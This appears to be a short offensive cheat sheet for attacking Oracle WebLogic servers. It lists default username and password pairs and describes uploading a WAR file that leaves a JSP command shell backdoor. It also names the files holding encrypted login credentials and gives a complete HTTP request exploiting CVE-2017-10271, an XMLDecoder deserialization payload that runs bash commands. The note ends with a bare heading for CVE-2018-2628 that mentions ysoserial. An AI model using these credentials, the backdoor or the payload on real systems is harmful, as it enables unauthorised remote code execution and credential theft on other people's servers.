#weblogic



### weak password exploit

using the test.war

some of the default password of weblogic

system:password
weblogic:weblogic
admin:security
joe:password
many:password
system:security
wlcsystem:wlcsystem
wlpisystem:wlpisystem


when uploaded the war successfully, the backdoor will be available at:
xxxx/test666/shell.jsp?cmd=ls


login credentials path:

config/config.xml (node-manager-password-encrypted)
conf/SerializedSystemIni.dat



CVE-2017-10271 XMLDecode unserialize exploit
payload:
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 127.0.0.1:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 587

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>ls -al</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```


CVE-2018-2628: Weblogic WLS Core Components deserialization exploit

ysoserial